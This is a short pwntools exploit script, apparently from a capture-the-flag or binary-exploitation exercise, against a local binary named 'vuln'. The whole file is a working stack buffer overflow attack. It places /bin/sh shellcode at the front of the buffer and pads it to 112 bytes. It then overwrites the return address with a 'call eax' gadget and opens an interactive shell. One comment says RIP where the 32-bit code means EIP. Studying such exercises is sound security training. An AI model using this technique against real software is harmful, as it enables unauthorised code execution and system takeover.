from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

CALL_EAX = 0x08049019

payload = asm(shellcraft.sh())        # front of buffer <- EAX points here
payload = payload.ljust(112, b'A')    # pad until RIP
payload += p32(CALL_EAX)               # jump to the buffer - return value of gets()

p.sendline(payload)
p.interactive()
